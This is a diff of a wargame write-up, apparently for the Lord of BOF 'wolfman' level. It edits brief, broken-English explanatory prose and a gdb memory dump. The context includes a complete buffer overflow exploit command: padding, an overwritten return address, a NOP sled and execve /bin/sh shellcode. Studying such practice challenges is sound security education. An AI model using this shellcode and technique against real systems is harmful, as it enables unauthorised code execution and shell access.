@@ -54,9 +54,7 @@ main(int argc, char *argv[])
 
 In the code, the egghunter likes as level4.
 
-Also, there is a buffer hunter that buffer will be reset in the bottem line.
-
-But, there is no limit in the input values.
+Also, there is a buffer hunter that buffer will be reset in the bottem line, but there is no limit in the input values.
 
 So, I will input the shell code in the return address.
 
@@ -78,7 +76,7 @@ Program terminated with signal 11, Segmentation fault.
 0xbffffc30:     0x41414141      0x41414141      0x41414141      0x41414141
 0xbffffc40:     0x41414141      0x41414141      0x41414141      0x41414141
 0xbffffc50:     0x41414141      0x41414141      0xbfffffff      0x90909090
-0xbffffc60:     0x90909090      0x90909090      0x90909090      0x90909090\
+0xbffffc60:     0x90909090      0x90909090      0x90909090      0x90909090
 
 [orc@localhost orc]$ ./wolfman `python -c 'print "A"*44+"\x60\xfc\xff\xbf"+"\x90"*20+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`üÿ¿1ÀPh//shh/bin‰ãPS‰á‰Â°
